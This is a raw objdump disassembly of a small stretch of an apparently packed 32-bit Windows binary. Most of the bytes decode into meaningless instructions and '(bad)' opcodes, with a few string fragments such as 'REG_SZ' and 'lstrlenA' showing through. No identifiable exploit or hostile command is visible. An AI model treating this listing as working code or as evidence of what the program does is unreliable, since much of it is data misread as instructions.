  409ba7:	e8 f2 76 ee ef       	call   0xf02f129e
  409bac:	fb                   	sti
  409bad:	f2 ee                	repnz out %al,(%dx)
  409baf:	ea 20 2d c5 5b fb b7 	ljmp   $0xb7fb,$0x5bc52d20
  409bb6:	76 e4                	jbe    0x409b9c
  409bb8:	b8 8c e5 20 e1       	mov    $0xe120e58c,%eax
  409bbd:	e5 e7                	in     $0xe7,%eax
  409bbf:	e2 ee                	loop   0x409baf
  409bc1:	02 9d f2 d0 da d6    	add    -0x29252f0e(%ebp),%bl
  409bc7:	0c 5b                	or     $0x5b,%al
  409bc9:	32 24 f0             	xor    (%eax,%esi,8),%ah
  409bcc:	35 17 c3 db 84       	xor    $0x84dbc317,%eax
  409bd1:	b6 b4                	mov    $0xb4,%dh
  409bd3:	59                   	pop    %ecx
  409bd4:	8d 56 58             	lea    0x58(%esi),%edx
  409bd7:	61                   	popa
  409bd8:	63 68 4f             	arpl   %ebp,0x4f(%eax)
  409bdb:	75 ed                	jne    0x409bca
  409bdd:	76 61                	jbe    0x409c40
  409bdf:	61                   	popa
  409be0:	20 d8                	and    %bl,%al
  409be2:	6d                   	insl   (%dx),%es:(%edi)
  409be3:	69 63 6f 66 0a b8 6d 	imul   $0x6db80a66,0x6f(%ebx),%esp
  409bea:	11 b6 b3 ad 8a a7    	adc    %esi,-0x5875524d(%esi)
  409bf0:	2d b4 64 10 61       	sub    $0x611064b4,%eax
  409bf5:	32 0b                	xor    (%ebx),%cl
  409bf7:	85 c2                	test   %eax,%edx
  409bf9:	77 85                	ja     0x409b80
  409bfb:	76 6f                	jbe    0x409c6c
  409bfd:	63 61 62             	arpl   %esp,0x62(%ecx)
  409c00:	71 8d                	jno    0x409b8f
  409c02:	67 6b 84 72 20 6c    	imul   $0x6c,0x2072(%si),%eax
  409c08:	9c                   	pushf
  409c09:	2e 69 b8 67 0d ed d6 	imul   $0xcd202e7e,%cs:-0x2912f299(%eax),%edi
  409c10:	7e 2e 20 cd 
  409c14:	e0 e6                	loopne 0x409bfc
  409c16:	90                   	nop
  409c17:	7b 4f                	jnp    0x409c68
  409c19:	4b                   	dec    %ebx
  409c1a:	85 37                	test   %esi,(%edi)
  409c1c:	ed                   	in     (%dx),%eax
  409c1d:	76 48                	jbe    0x409c67
  409c1f:	08 db                	or     %bl,%bl
  409c21:	e0 f7                	loopne 0x409c1a
  409c23:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409c24:	e0 3e                	loopne 0x409c64
  409c26:	62 08                	bound  %ecx,(%eax)
  409c28:	e8 b6 ee b7 28       	call   0x28f88ae3
  409c2d:	cf                   	iret
  409c2e:	ee                   	out    %al,(%dx)
  409c2f:	f1                   	int1
  409c30:	eb e5                	jmp    0x409c17
  409c32:	20 e6                	and    %ah,%dh
  409c34:	9e                   	sahf
  409c35:	e8 28 e5 b7 ad       	call   0xadf88162
  409c3a:	6b 6f 75 ea          	imul   $0xffffffea,0x75(%edi),%ebp
  409c3e:	f0 fb                	lock sti
  409c40:	e2 1d                	loop   0x409c5f
  409c42:	3d ef 2a e3 33       	cmp    $0x33e32aef,%eax
  409c47:	ec                   	in     (%dx),%al
  409c48:	ec                   	in     (%dx),%al
  409c49:	7d b7                	jge    0x409c02
  409c4b:	ed                   	in     (%dx),%eax
  409c4c:	b6 f3                	mov    $0xf3,%dh
  409c4e:	44                   	inc    %esp
  409c4f:	ee                   	out    %al,(%dx)
  409c50:	dc ff                	fdivr  %st,%st(7)
  409c52:	e2 29                	loop   0x409c7d
  409c54:	ed                   	in     (%dx),%eax
  409c55:	24 f1                	and    $0xf1,%al
  409c57:	ee                   	out    %al,(%dx)
  409c58:	ee                   	out    %al,(%dx)
  409c59:	e1 f9                	loope  0x409c54
  409c5b:	db b6 46 8b 09 07    	(bad) 0x7098b46(%esi)
  409c61:	34 e5                	xor    $0xe5,%al
  409c63:	f7 70 ec             	divl   -0x14(%eax)
  409c66:	36 63 80 75 9d 79 f8 	arpl   %eax,%ss:-0x786628b(%eax)
  409c6d:	15 e8 66 15 c2       	adc    $0xc21566e8,%eax
  409c72:	12 ba 43 45 e3 70    	adc    0x70e34543(%edx),%bh
  409c78:	ff 53 85             	call   *-0x7b(%ebx)
  409c7b:	cf                   	iret
  409c7c:	71 1b                	jno    0x409c99
  409c7e:	83 50 72 46          	adcl   $0x46,0x72(%eax)
  409c82:	ab                   	stos   %eax,%es:(%edi)
  409c83:	74 84                	je     0x409c09
  409c85:	61                   	popa
  409c86:	63 08                	arpl   %ecx,(%eax)
  409c88:	b7 73                	mov    $0x73,%bh
  409c8a:	e8 72 74 8a 21       	call   0x21cb1101
  409c8f:	67 0d dc da 2d c2    	addr16 or $0xc22ddadc,%eax
  409c95:	90                   	nop
  409c96:	26 44                	es inc %esp
  409c98:	6f                   	outsl  %ds:(%esi),(%dx)
  409c99:	44                   	inc    %esp
  409c9a:	34 6c                	xor    $0x6c,%al
  409c9c:	6f                   	outsl  %ds:(%esi),(%dx)
  409c9d:	5b                   	pop    %ebx
  409c9e:	2b bc 35 94 77 19 64 	sub    0x64197794(%ebp,%esi,1),%edi
  409ca5:	6f                   	outsl  %ds:(%esi),(%dx)
  409ca6:	77 26                	ja     0x409cce
  409ca8:	05 0a 61 ed 16       	add    $0x16ed610a,%eax
  409cad:	0c 0d                	or     $0xd,%al
  409caf:	32 75 e5             	xor    -0x1b(%ebp),%dh
  409cb2:	df 6d 46             	fildll 0x46(%ebp)
  409cb5:	61                   	popa
  409cb6:	67 b4 0d             	addr16 mov $0xd,%ah
  409cb9:	81 b1 1d 22 b3 22 40 	xorl   $0xffdb7040,0x22b3221d(%ecx)
  409cc0:	70 db ff 
  409cc3:	6f                   	outsl  %ds:(%esi),(%dx)
  409cc4:	ad                   	lods   %ds:(%esi),%eax
  409cc5:	39 6f 5b             	cmp    %ebp,0x5b(%edi)
  409cc8:	00 52 45             	add    %dl,0x45(%edx)
  409ccb:	47                   	inc    %edi
  409ccc:	5f                   	pop    %edi
  409ccd:	53                   	push   %ebx
  409cce:	5a                   	pop    %edx
  409ccf:	00 5c 44 65          	add    %bl,0x65(%esp,%eax,2)
  409cd3:	66 61                	popaw
  409cd5:	1b 74 d3 56          	sbb    0x56(%ebx,%edx,8),%esi
  409cd9:	d8 b6 49 9b 6e 0c    	fdivs  0xc6e9b49(%esi)
  409cdf:	73 95                	jae    0x409c76
  409ce1:	26 5c                	es pop %esp
  409ce3:	5c                   	pop    %esp
  409ce4:	97                   	xchg   %eax,%edi
  409ce5:	be b9 db 5c 0f       	mov    $0xf5cdbb9,%esi
  409cea:	6d                   	insl   (%dx),%es:(%edi)
  409ceb:	6d                   	insl   (%dx),%es:(%edi)
  409cec:	6d                   	insl   (%dx),%es:(%edi)
  409ced:	13 00                	adc    (%eax),%eax
  409cef:	2c 30                	sub    $0x30,%al
  409cf1:	00 a1 46 54 f6 d6    	add    %ah,-0x2909abba(%ecx)
  409cf7:	da db                	fcmovu %st(3),%st
  409cf9:	57                   	push   %edi
  409cfa:	41                   	inc    %ecx
  409cfb:	32 5c 4d 69          	xor    0x69(%ebp,%ecx,2),%bl
  409cff:	57                   	push   %edi
  409d00:	8e a1 74 5c 57 90    	mov    -0x6fa8a38c(%ecx),%fs
  409d06:	1d db e6 3e 73       	sbb    $0x733ee6db,%eax
  409d0b:	5c                   	pop    %esp
  409d0c:	43                   	inc    %ebx
  409d0d:	75 d3                	jne    0x409ce2
  409d0f:	8c 56 ec             	mov    %ss,-0x14(%esi)
  409d12:	73 76                	jae    0x409d8a
  409d14:	5c                   	pop    %esp
  409d15:	51                   	push   %ecx
  409d16:	ea ca b7 52 98 00 41 	ljmp   $0x4100,$0x9852b7ca
  409d1d:	6c                   	insb   (%dx),%es:(%edi)
  409d1e:	63 fd                	arpl   %edi,%ebp
  409d20:	00 9f 23 45 6a ad    	add    %bl,-0x5295badd(%edi)
  409d26:	52                   	push   %edx
  409d27:	f2 08 a8 82 45 ff 81 	repnz or %ch,-0x7e00ba7e(%eax)
  409d2e:	b1 8c                	mov    $0x8c,%cl
  409d30:	44                   	inc    %esp
  409d31:	fa                   	cli
  409d32:	ad                   	lods   %ds:(%esi),%eax
  409d33:	00 49 6e             	add    %cl,0x6e(%ecx)
  409d36:	66 6f                	outsw  %ds:(%esi),(%dx)
  409d38:	00 54 92 34          	add    %dl,0x34(%edx,%edx,4)
  409d3c:	08 db                	or     %bl,%bl
  409d3e:	61                   	popa
  409d3f:	68 75 61 df 3a       	push   $0x3adf6175
  409d44:	3a 16                	cmp    (%esi),%dl
  409d46:	ee                   	out    %al,(%dx)
  409d47:	68 df 09 ce ca       	push   $0xcace09df
  409d4c:	00 3f                	add    %bh,(%edi)
  409d4e:	00 81 f5 ee e4 59    	add    %al,0x59e4eef5(%ecx)
  409d54:	78 d2                	js     0x409d28
  409d56:	ff f6                	push   %esi
  409d58:	d6                   	salc
  409d59:	ff 04 44             	incl   (%esp,%eax,2)
  409d5c:	49                   	dec    %ecx
  409d5d:	54                   	push   %esp
  409d5e:	96                   	xchg   %eax,%esi
  409d5f:	54                   	push   %esp
  409d60:	41                   	inc    %ecx
  409d61:	54                   	push   %esp
  409d62:	49                   	dec    %ecx
  409d63:	43                   	inc    %ebx
  409d64:	00 42 55             	add    %al,0x55(%edx)
  409d67:	54                   	push   %esp
  409d68:	e4 14                	in     $0x14,%al
  409d6a:	15 20 c0 4e 39       	adc    $0x394ec020,%eax
  409d6f:	51                   	push   %ecx
  409d70:	32 20                	xor    (%eax),%ah
  409d72:	2c 00                	sub    $0x0,%al
  409d74:	42                   	inc    %edx
  409d75:	a0 40 50 55 ff       	mov    0xff555040,%al
  409d7a:	bf 00 22 05 00       	mov    $0x52200,%edi
  409d7f:	49                   	dec    %ecx
  409d80:	00 4d 00             	add    %cl,0x0(%ebp)
  409d83:	41                   	inc    %ecx
  409d84:	00 47 00             	add    %al,0x0(%edi)
  409d87:	45                   	inc    %ebp
  409d88:	00 49 9a             	add    %cl,-0x66(%ecx)
  409d8b:	ee                   	out    %al,(%dx)
  409d8c:	e4 42                	in     $0x42,%al
  409d8e:	4d                   	dec    %ebp
  409d8f:	42                   	inc    %edx
  409d90:	3e 03 28             	add    %ds:(%eax),%ebp
  409d93:	01 cb                	add    %ecx,%ebx
  409d95:	05 72 7b 05 00       	add    $0x57b72,%eax
  409d9a:	04 00                	add    $0x0,%al
  409d9c:	ff 00                	incl   (%eax)
  409d9e:	cb                   	lret
  409d9f:	ff                   	(bad)
  409da0:	ff                   	(bad)
  409da1:	bb 80 0f 50 41       	mov    $0x41500f80,%ebx
  409da6:	6c                   	insb   (%dx),%es:(%edi)
  409da7:	42                   	inc    %edx
  409da8:	9f                   	lahf
  409da9:	26 70 f9             	es jo  0x409da5
  409dac:	80 46 c8 8a          	addb   $0x8a,-0x38(%esi)
  409db0:	bc b0 37 37 e7       	mov    $0xe73737b0,%esp
  409db5:	75 ee                	jne    0x409da5
  409db7:	43                   	inc    %ebx
  409db8:	4e                   	dec    %esi
  409db9:	ff                   	(bad)
  409dba:	ff                   	(bad)
  409dbb:	ff 37                	push   (%edi)
  409dbd:	e2 a4                	loop   0x409d63
  409dbf:	c6                   	(bad)
  409dc0:	d9 47 37             	flds   0x37(%edi)
  409dc3:	cd 5b                	int    $0x5b
  409dc5:	1e                   	push   %ds
  409dc6:	23 ed                	and    %ebp,%ebp
  409dc8:	26 5a                	es pop %edx
  409dca:	d7                   	xlat   %ds:(%ebx)
  409dcb:	b7 3c                	mov    $0x3c,%bh
  409dcd:	c8 a0 92 c4          	enter  $0x92a0,$0xc4
  409dd1:	56                   	push   %esi
  409dd2:	45                   	inc    %ebp
  409dd3:	e7 5f                	out    %eax,$0x5f
  409dd5:	42                   	inc    %edx
  409dd6:	25 e5 b3 fb ff       	and    $0xfffbb3e5,%eax
  409ddb:	ff 4f 00             	decl   0x0(%edi)
  409dde:	f9                   	stc
  409ddf:	aa                   	stos   %al,%es:(%edi)
  409de0:	68 a2 fa db b0       	push   $0xb0dbfaa2
  409de5:	1d 19 8d 05 09       	sbb    $0x9058d19,%eax
  409dea:	25 9f 0c 5e 89       	and    $0x895e0c9f,%eax
  409def:	f3 22 1f             	repz and (%edi),%bl
  409df2:	d3 53 ff             	rcll   %cl,-0x1(%ebx)
  409df5:	ff                   	(bad)
  409df6:	ff                   	(bad)
  409df7:	ff 26                	jmp    *(%esi)
  409df9:	e8 41 70 d3 ae       	call   0xaf140e3f
  409dfe:	2b a9 f2 bc 9a 19    	sub    0x199abcf2(%ecx),%ebp
  409e04:	55                   	push   %ebp
  409e05:	8a 05 6c 68 b1 41    	mov    0x41b1686c,%al
  409e0b:	19 9f 80 6c e6 fa    	sbb    %ebx,-0x5199380(%edi)
  409e11:	d2 d7                	rcl    %cl,%bh
  409e13:	37                   	aaa
  409e14:	1d c9 11 7e ff       	sbb    $0xff7e11c9,%eax
  409e19:	ff                   	lcall  (bad)
  409e1a:	dd 03                	fldl   (%ebx)
  409e1c:	21 2f                	and    %ebp,(%edi)
  409e1e:	9d                   	popf
  409e1f:	ef                   	out    %eax,(%dx)
  409e20:	25 b0 8a 96 9e       	and    $0x9e968ab0,%eax
  409e25:	4f                   	dec    %edi
  409e26:	5b                   	pop    %ebx
  409e27:	94                   	xchg   %eax,%esp
  409e28:	75 46                	jne    0x409e70
  409e2a:	6c                   	insb   (%dx),%es:(%edi)
  409e2b:	e7 4a                	out    %eax,$0x4a
  409e2d:	03 81 1f cc c4 37    	add    0x37c4cc1f(%ecx),%eax
  409e33:	77 77                	ja     0x409eac
  409e35:	6f                   	outsl  %ds:(%esi),(%dx)
  409e36:	05 1c 36 e7 6f       	add    $0x6fe7361c,%eax
  409e3b:	f4                   	hlt
  409e3c:	3e bc 1f 47 53 81    	ds mov $0x8153471f,%esp
  409e42:	fb                   	sti
  409e43:	4c                   	dec    %esp
  409e44:	06                   	push   %es
  409e45:	cd cd                	int    $0xcd
  409e47:	9b                   	fwait
  409e48:	9b                   	fwait
  409e49:	8c e2                	mov    %fs,%edx
  409e4b:	c8 dd 1d 18          	enter  $0x1ddd,$0x18
  409e4f:	2f                   	das
  409e50:	f3 ed                	repz in (%dx),%eax
  409e52:	22 aa 54 ff cd dd    	and    -0x223200ac(%edx),%ch
  409e58:	cd 52                	int    $0x52
  409e5a:	95                   	xchg   %eax,%ebp
  409e5b:	ef                   	out    %eax,(%dx)
  409e5c:	17                   	pop    %ss
  409e5d:	42                   	inc    %edx
  409e5e:	8f                   	(bad)
  409e5f:	b8 ec c4 8c 02       	mov    $0x28cc4ec,%eax
  409e64:	01 42 b5             	add    %eax,-0x4b(%edx)
  409e67:	08 00                	or     %al,(%eax)
  409e69:	8e ed                	mov    %ebp,%gs
  409e6b:	6e                   	outsb  %ds:(%esi),(%dx)
  409e6c:	ee                   	out    %al,(%dx)
  409e6d:	36 77 bf             	ss ja  0x409e2f
  409e70:	8d                   	lea    (bad),%edx
  409e71:	d3 53 01             	rcll   %cl,0x1(%ebx)
  409e74:	26 9f                	es lahf
  409e76:	94                   	xchg   %eax,%esp
  409e77:	e4 20                	in     $0x20,%al
  409e79:	d4 55                	aam    $0x55
  409e7b:	51                   	push   %ecx
  409e7c:	6e                   	outsb  %ds:(%esi),(%dx)
  409e7d:	6e                   	outsb  %ds:(%esi),(%dx)
  409e7e:	6e                   	outsb  %ds:(%esi),(%dx)
  409e7f:	6e                   	outsb  %ds:(%esi),(%dx)
  409e80:	2d fb 52 30 a7       	sub    $0xa73052fb,%eax
  409e85:	e8 5e 81 1a 4a       	call   0x4a5b1fe8
  409e8a:	1e                   	push   %ds
  409e8b:	92                   	xchg   %eax,%edx
  409e8c:	e6 ee                	out    %al,$0xee
  409e8e:	ee                   	out    %al,(%dx)
  409e8f:	6f                   	outsl  %ds:(%esi),(%dx)
  409e90:	fe                   	(bad)
  409e91:	d3 c2                	rol    %cl,%edx
  409e93:	45                   	inc    %ebp
  409e94:	52                   	push   %edx
  409e95:	89 01                	mov    %eax,(%ecx)
  409e97:	0f 4b 1f             	cmovnp (%edi),%ebx
  409e9a:	8f                   	(bad)
  409e9b:	6f                   	outsl  %ds:(%esi),(%dx)
  409e9c:	e7 8e                	out    %eax,$0x8e
  409e9e:	c6                   	(bad)
  409e9f:	e6 e6                	out    %al,$0xe6
  409ea1:	ee                   	out    %al,(%dx)
  409ea2:	ef                   	out    %eax,(%dx)
  409ea3:	46                   	inc    %esi
  409ea4:	0b 32                	or     (%edx),%esi
  409ea6:	3f                   	aas
  409ea7:	f0 23 af 6f 5a 47 80 	lock and -0x7fb8a591(%edi),%ebp
  409eae:	f9                   	stc
  409eaf:	4a                   	dec    %edx
  409eb0:	06                   	push   %es
  409eb1:	f7 e6                	mul    %esi
  409eb3:	e6 e6                	out    %al,$0xe6
  409eb5:	a9 fc d5 8a 05       	test   $0x58ad5fc,%eax
  409eba:	58                   	pop    %eax
  409ebb:	07                   	pop    %es
  409ebc:	94                   	xchg   %eax,%esp
  409ebd:	f6 d8                	neg    %al
  409ebf:	d9 41 4f             	flds   0x4f(%ecx)
  409ec2:	ff f7                	push   %edi
  409ec4:	e6 ee                	out    %al,$0xee
  409ec6:	73 2f                	jae    0x409ef7
  409ec8:	f4                   	hlt
  409ec9:	50                   	push   %eax
  409eca:	b8 b9 5f 40 86       	mov    $0x86405fb9,%eax
  409ecf:	03 40 1c             	add    0x1c(%eax),%eax
  409ed2:	98                   	cwtl
  409ed3:	e3 8f                	jecxz  0x409e64
  409ed5:	b1 77                	mov    $0x77,%cl
  409ed7:	77 73                	ja     0x409f4c
  409ed9:	dd c0                	ffree  %st(0)
  409edb:	52                   	push   %edx
  409edc:	1b 2f                	sbb    (%edi),%ebp
  409ede:	fe                   	(bad)
  409edf:	bf e1 25 fb 4f       	mov    $0x4ffb25e1,%edi
  409ee4:	df d8                	(bad)
  409ee6:	be e6 ee f3 42       	mov    $0x42f3eee6,%esi
  409eeb:	16                   	push   %ss
  409eec:	4f                   	dec    %edi
  409eed:	f9                   	stc
  409eee:	c9                   	leave
  409eef:	f8                   	clc
  409ef0:	83 7f 45 0f          	cmpl   $0xf,0x45(%edi)
  409ef4:	53                   	push   %ebx
  409ef5:	bf fb ff 6f 8f       	mov    $0x8f6ffffb,%edi
  409efa:	7e 50                	jle    0x409f4c
  409efc:	cf                   	iret
  409efd:	df c7                	ffreep %st(7)
  409eff:	81 8c ab 74 dd 50 18 	orl    $0xaa20ad7b,0x1850dd74(%ebx,%ebp,4)
  409f06:	7b ad 20 aa 
  409f0a:	5b                   	pop    %ebx
  409f0b:	0f 13 85 82 a0 7f cb 	movlps %xmm0,-0x34805f7e(%ebp)
  409f12:	60                   	pusha
  409f13:	ff                   	(bad)
  409f14:	ff                   	(bad)
  409f15:	ff 9d 02 ae 4b c2    	lcall  *-0x3db451fe(%ebp)
  409f1b:	4e                   	dec    %esi
  409f1c:	57                   	push   %edi
  409f1d:	4f                   	dec    %edi
  409f1e:	17                   	pop    %ss
  409f1f:	c5 09                	lds    (%ecx),%ecx
  409f21:	96                   	xchg   %eax,%esi
  409f22:	82 62 68 d4          	andb   $0xd4,0x68(%edx)
  409f26:	9e                   	sahf
  409f27:	d9 61 bd             	fldenv -0x43(%ecx)
  409f2a:	e8 7a 5c 41 1f       	call   0x1f81fba9
  409f2f:	ff                   	(bad)
  409f30:	ff                   	(bad)
  409f31:	ff                   	(bad)
  409f32:	ff d4                	call   *%esp
  409f34:	8c d9                	mov    %ds,%ecx
  409f36:	71 a4                	jno    0x409edc
  409f38:	26 62 9c 44 d7 de 0c 	bound  %ebx,%es:-0x71f32129(%esp,%eax,2)
  409f3f:	8e 
  409f40:	40                   	inc    %eax
  409f41:	62 5d c6             	bound  %ebx,-0x3a(%ebp)
  409f44:	9c                   	pushf
  409f45:	d9 6d b5             	fldcw  -0x4b(%ebp)
  409f48:	2e 67 52             	cs addr16 push %edx
  409f4b:	90                   	nop
  409f4c:	da d7                	fcmovbe %st(7),%st
  409f4e:	08 9d 9d a2 ff 2f    	or     %bl,0x2fffa29d(%ebp)
  409f54:	fc                   	cld
  409f55:	ff 6d da             	ljmp   *-0x26(%ebp)
  409f58:	50                   	push   %eax
  409f59:	14 60                	adc    $0x60,%al
  409f5b:	aa                   	stos   %al,%es:(%edi)
  409f5c:	e8 68 9c e4 52       	call   0x53253bc9
  409f61:	5b                   	pop    %ebx
  409f62:	82 12 df             	adcb   $0xdf,(%edx)
  409f65:	f2 0a 50 13          	repnz or 0x13(%eax),%dl
  409f69:	6e                   	outsb  %ds:(%esi),(%dx)
  409f6a:	b4 26                	mov    $0x26,%ah
  409f6c:	7a 47                	jp     0x409fb5
  409f6e:	59                   	pop    %ecx
  409f6f:	17                   	pop    %ss
  409f70:	f7 ff                	idiv   %edi
  409f72:	ff                   	(bad)
  409f73:	ff c4                	inc    %esp
  409f75:	0d 95 8b a2 72       	or     $0x72a28b95,%eax
  409f7a:	06                   	push   %es
  409f7b:	9d                   	popf
  409f7c:	11 66 a3             	adc    %esp,-0x5d(%esi)
  409f7f:	e6 87                	out    %al,$0x87
  409f81:	b6 bd                	mov    $0xbd,%dh
  409f83:	3d 77 8a 14 1e       	cmp    $0x1e148a77,%eax
  409f88:	2b f1                	sub    %ecx,%esi
  409f8a:	47                   	inc    %edi
  409f8b:	48                   	dec    %eax
  409f8c:	cd b9                	int    $0xb9
  409f8e:	73 f0                	jae    0x409f80
  409f90:	0f ff ff             	ud0    %edi,%edi
  409f93:	ff                   	(bad)
  409f94:	ff f5                	push   %ebp
  409f96:	c7 84 82 ac 7e df 95 	movl   $0xe8ae6814,-0x6a208154(%edx,%eax,4)
  409f9d:	14 68 ae e8 
  409fa1:	79 56                	jns    0x409ff9
  409fa3:	50                   	push   %eax
  409fa4:	d1 df                	rcr    $1,%edi
  409fa6:	15 90 4c b4 7a       	adc    $0x7ab44c90,%eax
  409fab:	cb                   	lret
  409fac:	83 d9 b6             	sbb    $0xffffffb6,%ecx
  409faf:	76 f8                	jbe    0x409fa9
  409fb1:	ba 9c 40 ff db       	mov    $0xdbff409c,%edx
  409fb6:	ff                   	(bad)
  409fb7:	ff c4                	inc    %esp
  409fb9:	d6                   	salc
  409fba:	c9                   	leave
  409fbb:	78 66                	js     0x40a023
  409fbd:	4f                   	dec    %edi
  409fbe:	95                   	xchg   %eax,%ebp
  409fbf:	e0 94                	loopne 0x409f55
  409fc1:	1c 6c                	sbb    $0x6c,%al
  409fc3:	66 26 78 5e          	data16 es js 0x40a025
  409fc7:	55                   	push   %ebp
  409fc8:	c5 d7 2f             	(bad)
  409fcb:	89 a1 71 c2 9d 06    	mov    %esp,0x69dc271(%ecx)
  409fd1:	a0 67 e9 ff 37       	mov    0x37ffe967,%al
  409fd6:	de f8                	fdivrp %st,%st(0)
  409fd8:	ab                   	stos   %eax,%es:(%edi)
  409fd9:	b1 ba                	mov    $0xba,%cl
  409fdb:	37                   	aaa
  409fdc:	33 5f 6c             	xor    0x6c(%edi),%ebx
  409fdf:	30 eb                	xor    %ch,%bl
  409fe1:	1f                   	pop    %ds
  409fe2:	cd 22                	int    $0x22
  409fe4:	73 b0                	jae    0x409f96
  409fe6:	22 c6                	and    %dh,%al
  409fe8:	41                   	inc    %ecx
  409fe9:	93                   	xchg   %eax,%ebx
  409fea:	23 4b ff             	and    -0x1(%ebx),%ecx
  409fed:	ff                   	(bad)
  409fee:	ff                   	(bad)
  409fef:	ff 94 9b 04 f5 38 1d 	call   *0x1d38f504(%ebx,%ebx,4)
  409ff6:	f8                   	clc
  409ff7:	81 47 c9 8b f7 e4 00 	addl   $0xe4f78b,-0x37(%edi)
  409ffe:	7a b4                	jp     0x409fb4
  40a000:	24 58                	and    $0x58,%al
  40a002:	05 f3 7f 45 cd       	add    $0xcd457ff3,%eax
  40a007:	b8 7f 9d 8a eb       	mov    $0xeb8a9d7f,%eax
  40a00c:	f7 65 70             	mull   0x70(%ebp)
  40a00f:	be d9 d8 f1 ff       	mov    $0xfff1d8d9,%esi
  40a014:	32 29                	xor    (%ecx),%ch
  40a016:	01 cf                	add    %ecx,%edi
  40a018:	63 3c a3             	arpl   %edi,(%ebx,%eiz,4)
  40a01b:	cd 1e                	int    $0x1e
  40a01d:	82 8a b9 9f f7 75 af 	orb    $0xaf,0x75f79fb9(%edx)
  40a024:	fe 80 2c 6a bc e4    	incb   -0x1b4395d4(%eax)
  40a02a:	46                   	inc    %esi
  40a02b:	d5 8a                	aad    $0x8a
  40a02d:	bb 52 bf ec 06       	mov    $0x6ecbf52,%ebx
  40a032:	88 ec                	mov    %ch,%ah
  40a034:	09 3c 20             	or     %edi,(%eax,%eiz,1)
  40a037:	01 6c 73 74          	add    %ebp,0x74(%ebx,%esi,2)
  40a03b:	72 41                	jb     0x40a07e
  40a03d:	57                   	push   %edi
  40a03e:	c1 f2 6c             	shl    $0x6c,%edx
  40a041:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a043:	41                   	inc    %ecx
  40a044:	43                   	inc    %ebx
  40a045:	f0 48                	lock dec %eax
  40a047:	15 dc b5 56 7b       	adc    $0x7b56b5dc,%eax
  40a04c:	0e                   	push   %cs
  40a04d:	0c 6f                	or     $0x6f,%al
  40a04f:	70 79                	jo     0x40a0ca
  40a051:	ec                   	in     (%dx),%al
  40a052:	06                   	push   %es
  40a053:	c4 73 dc             	les    -0x24(%ebx),%esi
  40a056:	17                   	pop    %ss
  40a057:	36 74 65             	ss je  0x40a0bf
  40a05a:	0c 15                	or     $0x15,%al
  40a05c:	dc 55 10             	fcoml  0x10(%ebp)
  40a05f:	04 50                	add    $0x50,%al
  40a061:	72 6f                	jb     0x40a0d2
  40a063:	2c d6                	sub    $0xd6,%al
  40a065:	5a                   	pop    %edx
  40a066:	73 da                	jae    0x40a042
  40a068:	0c 13                	or     $0x13,%al
  40a06a:	2c 35                	sub    $0x35,%al
  40a06c:	0a fd                	or     %ch,%bh
  40a06e:	05 6b db 03 72       	add    $0x7203db6b,%eax
  40a073:	4c                   	dec    %esp
  40a074:	27                   	daa
  40a075:	0f 4e 65 78          	cmovle 0x78(%ebp),%esp
  40a079:	36 20 da             	ss and %bl,%dl
  40a07c:	81 0e 52 33 61 63    	orl    $0x63613352,(%esi)
  40a082:	e0 db                	loopne 0x40a05f
  40a084:	90                   	nop
  40a085:	c7                   	(bad)
  40a086:	0e                   	push   %cs
  40a087:	72 65                	jb     0x40a0ee
  40a089:	65 0d 47 65 74 43    	gs or  $0x43746547,%eax
  40a08f:	ee                   	out    %al,(%dx)
  40a090:	5e                   	pop    %esi
  40a091:	1b ab f5 4c 26 1e    	sbb    0x1e264cf5(%ebx),%ebp
  40a097:	10 45 6e             	adc    %al,0x6e(%ebp)
  40a09a:	76 88                	jbe    0x40a024
  40a09c:	bb 0a de 4d 6f       	mov    $0x6f4dde0a,%ebx
  40a0a1:	6e                   	outsb  %ds:(%esi),(%dx)
  40a0a2:	6d                   	insl   (%dx),%es:(%edi)
  40a0a3:	e2 61                	loop   0x40a106
  40a0a5:	72 69                	jb     0x40a110
  40a0a7:	f9                   	stc
  40a0a8:	cf                   	iret
  40a0a9:	66 0d 87 18          	or     $0x1887,%ax
  40a0ad:	50                   	push   %eax
  40a0ae:	74 74                	je     0x40a124
  40a0b0:	72 69                	jb     0x40a11b
  40a0b2:	62 75 74             	bound  %esi,0x74(%ebp)
  40a0b5:	e4 c9                	in     $0xc9,%al
  40a0b7:	7e 59                	jle    0x40a112
  40a0b9:	13 53 69             	adc    0x69(%ebx),%edx
  40a0bc:	7a 65                	jp     0x40a123
  40a0be:	0c 54                	or     $0x54,%al
  40a0c0:	69 6d 1f 6b db ff 4c 	imul   $0x4cffdb6b,0x1f(%ebp),%ebp
  40a0c7:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0c8:	67 69 63 61 6c 44 2e 	imul   $0x762e446c,0x61(%bp,%di),%esp
  40a0cf:	76 
  40a0d0:	2c 11                	sub    $0x11,%al
  40a0d2:	4d                   	dec    %ebp
  40a0d3:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0d4:	64 75 6c             	fs jne 0x40a143
  40a0d7:	d9 f2                	fptan
  40a0d9:	6b 20 24             	imul   $0x24,(%eax),%esp
  40a0dc:	4e                   	dec    %esi
  40a0dd:	61                   	popa
  40a0de:	41                   	inc    %ecx
  40a0df:	13 fa                	adc    %edx,%edi
  40a0e1:	b1 ed                	mov    $0xed,%cl
  40a0e3:	b0 d9                	mov    $0xd9,%al
  40a0e5:	11 e2                	adc    %esp,%edx
  40a0e7:	48                   	dec    %eax
  40a0e8:	f9                   	stc
  40a0e9:	70 0f                	jo     0x40a0fa
  40a0eb:	b3 85                	mov    $0x85,%bl
  40a0ed:	25 88 54 24 50       	and    $0x50245488,%eax
  40a0f2:	05 68 1d 03 e2       	add    $0xe2031d68,%eax
  40a0f7:	09 10                	or     %edx,(%eax)
  40a0f9:	83 44 69 55 f6       	addl   $0xfffffff6,0x55(%ecx,%ebp,2)
  40a0fe:	da c2                	fcmovb %st(2),%st
  40a100:	bb 6f 72 79 15       	mov    $0x1579726f,%ebx
  40a105:	06                   	push   %es
  40a106:	62 67 d7             	bound  %esp,-0x29(%edi)
  40a109:	0b 5b 6b             	or     0x6b(%ebx),%ebx
  40a10c:	41                   	inc    %ecx
  40a10d:	bc 35 05 41 f7       	mov    $0xf7410535,%esp
  40a112:	4c                   	dec    %esp
  40a113:	6d                   	insl   (%dx),%es:(%edi)
  40a114:	c9                   	leave
  40a115:	2f                   	das
  40a116:	c9                   	leave
  40a117:	6f                   	outsl  %ds:(%esi),(%dx)
  40a118:	61                   	popa
  40a119:	0d 63 6b 75 ee       	or     $0xee756b63,%eax
  40a11e:	b5 36                	mov    $0x36,%ch
